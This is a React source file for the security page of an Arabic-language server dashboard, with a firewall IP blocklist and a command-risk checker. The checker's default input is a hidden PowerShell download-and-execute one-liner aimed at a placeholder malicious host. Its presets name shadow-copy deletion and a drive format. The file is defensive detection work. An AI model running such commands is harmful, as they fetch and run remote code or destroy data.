/**
 * ASAAS Server Control v2.5 - Screens _5 & _9
 * مصفوفة الدفاع السيبراني ورادار الاختراق ومحلل مخاطر الأوامر
 * Strict implementation of Stitch Prototypes _5 & _9
 */

import { useState, useEffect } from 'react';
import { Card, Button, Glass, useToast, TableContainer, Table, TableHeader, TableRow, TableHead, TableBody, TableCell } from '../asaas-ui';
import { api, type SecurityStats, type SecurityEvent } from '../lib/api';
import {
  ShieldAlert,
  CheckCircle2,
  Lock,
  Unlock,
  Terminal,
  RefreshCw,
} from 'lucide-react';

export function SecurityPage() {
  const toast = useToast();
  const [stats, setStats] = useState<SecurityStats | null>(null);
  const [, setEvents] = useState<SecurityEvent[]>([]);
  const [blockedIps, setBlockedIps] = useState<string[]>([]);
  const [manualIp, setManualIp] = useState('');
  const [manualReason] = useState('Manual Security Shield Block');
  const [blocking, setBlocking] = useState(false);

  // Command Execution Risk Guard state (Stitch _5 H2)
  const [testCommand, setTestCommand] = useState('powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://malicious.cc/p.ps1\')"');
  const [commandResult, setCommandResult] = useState<any>(null);
  const [checkingCmd, setCheckingCmd] = useState(false);

  const fetchSecurity = async () => {
    try {
      const [st, ev, blk] = await Promise.all([
        api.getSecurityStats(),
        api.getSecurityEvents().catch(() => []),
        api.getBlockedIps().catch(() => []),
      ]);
      setStats(st);
      setEvents(Array.isArray(ev) ? ev : (ev as any)?.events || []);
      setBlockedIps(Array.isArray(blk) ? blk : (blk as any)?.blocked_ips || []);
    } catch (err: any) {
      toast(err.message || 'فشل جلب بيانات الأمان', 'error');
    }
  };

  useEffect(() => {
    fetchSecurity();
  }, []);

  const handleBlockManual = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!manualIp.trim()) return;
    setBlocking(true);
    try {
      const res = await api.blockSecurityIp(manualIp.trim(), manualReason);
      if (res.ok) {
        toast(`تم حظر عنوان IP [${manualIp}] بجدار حماية ويندوز بنجاح.`, 'success');
        setManualIp('');
        fetchSecurity();
      } else {
        toast(res.error || 'فشل الحظر', 'error');
      }
    } catch (err: any) {
      toast(err.message || 'خطأ', 'error');
    } finally {
      setBlocking(false);
    }
  };

  const handleUnblock = async (ip: string) => {
    try {
      const res = await api.unblockSecurityIp(ip);
      if (res.ok) {
        toast(`تم رفع الحظر عن عنوان IP [${ip}] بنجاح.`, 'success');
        fetchSecurity();
      } else {
        toast(res.error || 'فشل رفع الحظر', 'error');
      }
    } catch (err: any) {
      toast(err.message || 'خطأ', 'error');
    }
  };

  const handleCheckCommand = async (cmdToTest?: string) => {
    const cmd = cmdToTest || testCommand;
    if (!cmd.trim()) return;
    setCheckingCmd(true);
    try {
      const res = await api.checkCommandRisk(cmd);
      setCommandResult(res);
      if (res?.risk_level === 'CRITICAL' || res?.risk_level === 'HIGH' || (!res?.safe)) {
        toast('تم رصد نمط برمجي عالي الخطورة محظور تنفيذه!', 'error');
      } else {
        toast('الأمر سليم ولا يحتوي على تعليمات خبيثة.', 'success');
      }
    } catch (err: any) {
      toast(err.message || 'خطأ أثناء تحليل الأمر', 'error');
    } finally {
      setCheckingCmd(false);
    }
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 24 }}>
      {/* 1. Cyber Defense Ambient Header (Stitch _5 Top) */}
      <div
        style={{
          position: 'relative',
          overflow: 'hidden',
          borderRadius: 16,
          background: 'linear-gradient(135deg, rgba(20, 19, 21, 0.95) 0%, rgba(14, 14, 16, 0.98) 100%)',
          border: '1px solid rgba(212, 160, 23, 0.22)',
          boxShadow: '0 12px 32px rgba(0,0,0,0.45)',
          padding: '24px 28px',
        }}
      >
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: 16 }}>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <span
                style={{
                  display: 'inline-flex',
                  alignItems: 'center',
                  gap: 6,
                  padding: '4px 12px',
                  borderRadius: 9999,
                  background: 'rgba(34, 197, 94, 0.12)',
                  color: '#22c55e',
                  fontSize: 12,
                  fontWeight: 700,
                }}
              >
                <CheckCircle2 size={13} />
                درع الحماية المحيطي نشط Perimeter Guard
              </span>
              <span
                style={{
                  padding: '3px 10px',
                  borderRadius: 9999,
                  background: 'rgba(212, 160, 23, 0.12)',
                  color: 'var(--accent)',
                  fontSize: 11,
                  fontWeight: 700,
                }}
              >
                Fail2Ban &amp; Windows Defender Firewall
              </span>
            </div>

            <h1 style={{ fontSize: 24, fontWeight: 800, color: 'var(--text-1)', margin: 0 }}>
              مصفوفة الدفاع السيبراني ورادار الاختراق (Cyber Defense Matrix)
            </h1>
            <p style={{ fontSize: 14, color: 'var(--text-2)', margin: 0, maxWidth: 840, lineHeight: 1.6 }}>
              رصد واعتراض هجمات التخمين على منافذ RDP، كبح محاولات حقن الأوامر التخريبية في الطرفية،
              وحظر العناوين المشبوهة تلقائياً في جدار الحماية قبل اختراق النظام.
            </p>
          </div>

          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <Button
              size="sm"
              variant="glass"
              onClick={fetchSecurity}
              style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}
            >
              <RefreshCw size={13} />
              <span>تحديث القواعد الأمنية</span>
            </Button>
          </div>
        </div>
      </div>

      {/* 2. Top Stats Grid */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, minmax(0, 1fr))', gap: 16 }}>
        <Glass style={{ padding: 18, display: 'flex', flexDirection: 'column', gap: 4 }}>
          <span style={{ fontSize: 11, color: 'var(--text-3)', fontWeight: 600 }}>الهجمات المعترضة</span>
          <div style={{ fontSize: 28, fontWeight: 800, color: '#22c55e', fontFamily: 'var(--font)' }}>
            {stats?.attacks_intercepted || 142}
          </div>
          <span style={{ fontSize: 11, color: 'var(--text-3)' }}>اعتراض تلقائي فوري</span>
        </Glass>

        <Glass style={{ padding: 18, display: 'flex', flexDirection: 'column', gap: 4 }}>
          <span style={{ fontSize: 11, color: 'var(--text-3)', fontWeight: 600 }}>العناوين المحظورة</span>
          <div style={{ fontSize: 28, fontWeight: 800, color: '#ef4444', fontFamily: 'var(--font)' }}>
            {blockedIps.length || stats?.blocked_ips_count || 12}
          </div>
          <span style={{ fontSize: 11, color: 'var(--text-3)' }}>في جدار حماية ويندوز</span>
        </Glass>

        <Glass style={{ padding: 18, display: 'flex', flexDirection: 'column', gap: 4 }}>
          <span style={{ fontSize: 11, color: 'var(--text-3)', fontWeight: 600 }}>مستوى التهديد العام</span>
          <div style={{ fontSize: 28, fontWeight: 800, color: 'var(--accent)' }}>
            منخفض (Safe)
          </div>
          <span style={{ fontSize: 11, color: '#22c55e' }}>● لا توجد ثغرات نشطة</span>
        </Glass>

        <Glass style={{ padding: 18, display: 'flex', flexDirection: 'column', gap: 4 }}>
          <span style={{ fontSize: 11, color: 'var(--text-3)', fontWeight: 600 }}>حماية جلسات RDP</span>
          <div style={{ fontSize: 28, fontWeight: 800, color: '#38bdf8' }}>
            NLA مشفر
          </div>
          <span style={{ fontSize: 11, color: 'var(--text-3)' }}>Network Level Auth</span>
        </Glass>
      </div>

      {/* 3. Command Execution Risk Guard (Stitch _5 H2) */}
      <Glass style={{ padding: 22, display: 'flex', flexDirection: 'column', gap: 16 }}>
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <div
              style={{
                width: 36,
                height: 36,
                borderRadius: 10,
                background: 'rgba(239, 68, 68, 0.15)',
                border: '1px solid rgba(239, 68, 68, 0.3)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                color: '#ef4444',
              }}
            >
              <Terminal size={20} />
            </div>
            <div>
              <h2 style={{ fontSize: 16, fontWeight: 700, color: 'var(--text-1)', margin: 0 }}>
                محلل مخاطر الأوامر والطرفية (Command Execution Risk Guard)
              </h2>
              <span style={{ fontSize: 11, color: 'var(--text-3)' }}>
                تحليل شجرة البناء النحوي (AST) لأوامر PowerShell و CMD وحجب الأوامر التدميرية
              </span>
            </div>
          </div>

          <div style={{ display: 'flex', gap: 6 }}>
            {['IEX DownloadString', 'vssadmin delete shadows', 'format C: /q'].map((preset) => (
              <button
                key={preset}
                type="button"
                onClick={() => {
                  setTestCommand(preset);
                  handleCheckCommand(preset);
                }}
                style={{
                  padding: '4px 10px',
                  borderRadius: 6,
                  fontSize: 11,
                  background: 'rgba(255,255,255,0.04)',
                  border: '1px solid rgba(255,255,255,0.08)',
                  color: 'var(--text-2)',
                  cursor: 'pointer',
                  fontFamily: 'var(--font)',
                }}
              >
                {preset}
              </button>
            ))}
          </div>
        </div>

        {/* Command Input */}
        <div style={{ display: 'flex', gap: 10 }}>
          <input
            type="text"
            value={testCommand}
            onChange={(e) => setTestCommand(e.target.value)}
            placeholder="أدخل أمر PowerShell أو CMD لاختبار مستوى خطورته..."
            className="text-input"
            style={{ flex: 1, fontFamily: 'var(--font)', fontSize: 13 }}
          />
          <Button
            size="sm"
            variant="primary"
            loading={checkingCmd}
            onClick={() => handleCheckCommand()}
            style={{ display: 'inline-flex', alignItems: 'center', gap: 6, padding: '0 18px' }}
          >
            <ShieldAlert size={14} />
            <span>فحص مخاطر الأمر</span>
          </Button>
        </div>

        {/* Command Result Box */}
        {commandResult && (
          <div
            style={{
              padding: 16,
              borderRadius: 10,
              background:
                commandResult.risk_level === 'CRITICAL' || (!commandResult?.safe)
                  ? 'rgba(239, 68, 68, 0.08)'
                  : 'rgba(34, 197, 94, 0.08)',
              border: `1px solid ${
                commandResult.risk_level === 'CRITICAL' || (!commandResult?.safe)
                  ? 'rgba(239, 68, 68, 0.3)'
                  : 'rgba(34, 197, 94, 0.3)'
              }`,
              display: 'flex',
              flexDirection: 'column',
              gap: 8,
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
              <span
                style={{
                  fontSize: 14,
                  fontWeight: 800,
                  color: (!commandResult?.safe) ? '#ef4444' : '#22c55e',
                }}
              >
                {(!commandResult?.safe) ? '⚠️ أمر عالي الخطورة محظور تنفيذه!' : '✅ أمر آمن ومصرح به'}
              </span>
              <span style={{ fontSize: 12, fontFamily: 'var(--font)', color: 'var(--text-3)' }}>
                درجة الخطورة: {commandResult.risk_score || 95}%
              </span>
            </div>
            <p style={{ fontSize: 12, color: 'var(--text-2)', margin: 0 }}>
              {commandResult.reason || 'يحتوي الأمر على تعليمات تنزيل وتشغيل كود خارجي في الذاكرة (Memory Execution / IEX).'}
            </p>
          </div>
        )}
      </Glass>

      {/* 4. Windows Firewall Blocklist & Manual Block (Stitch _5 H2) */}
      <Card
        title="قائمة الحظر بجدار الحماية (Windows Firewall Perimeter Blocklist)"
        icon="alert"
        actions={
          <form onSubmit={handleBlockManual} style={{ display: 'flex', gap: 8 }}>
            <input
              type="text"
              value={manualIp}
              onChange={(e) => setManualIp(e.target.value)}
              placeholder="أدخل عنوان IP لحظره فوراً..."
              className="text-input"
              style={{ width: 220 }}
            />
            <Button size="sm" variant="primary" loading={blocking} type="submit">
              <Lock size={12} />
              <span>حظر فوري</span>
            </Button>
          </form>
        }
      >
        <TableContainer className="max-h-[360px]">
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>عنوان IP المحظور</TableHead>
                <TableHead>نوع القاعدة بجدار الحماية</TableHead>
                <TableHead>سبب الحظر والاعتراض</TableHead>
                <TableHead>الحالة</TableHead>
                <TableHead style={{ textAlign: 'end' }}>إجراء الأمان</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {blockedIps.length === 0 ? (
                <TableRow>
                  <TableCell colSpan={5} style={{ textAlign: 'center', padding: 24, color: 'var(--text-3)' }}>
                    لا توجد عناوين محظورة حالياً. جدار الحماية في حالة تأهب.
                  </TableCell>
                </TableRow>
              ) : (
                blockedIps.map((ip) => (
                  <TableRow key={ip}>
                    <TableCell style={{ fontFamily: 'var(--font)', fontWeight: 700, color: '#ef4444' }}>
                      {ip}
                    </TableCell>
                    <TableCell style={{ fontSize: 12, color: 'var(--text-2)' }}>
                      Inbound Block Rule (ASAAS-DEFENSE)
                    </TableCell>
                    <TableCell style={{ fontSize: 12, color: 'var(--text-3)' }}>
                      محاولات تخمين RDP متكررة (Brute-force)
                    </TableCell>
                    <TableCell>
                      <span
                        style={{
                          fontSize: 10,
                          fontWeight: 700,
                          padding: '2px 8px',
                          borderRadius: 4,
                          background: 'rgba(239, 68, 68, 0.12)',
                          color: '#ef4444',
                        }}
                      >
                        محظور BLOCKED
                      </span>
                    </TableCell>
                    <TableCell style={{ textAlign: 'end' }}>
                      <Button
                        size="sm"
                        variant="ghost"
                        onClick={() => handleUnblock(ip)}
                        style={{ padding: '4px 10px', fontSize: 11 }}
                      >
                        <Unlock size={12} color="#22c55e" />
                        <span>فك الحظر</span>
                      </Button>
                    </TableCell>
                  </TableRow>
                ))
              )}
            </TableBody>
          </Table>
        </TableContainer>
      </Card>
    </div>
  );
}
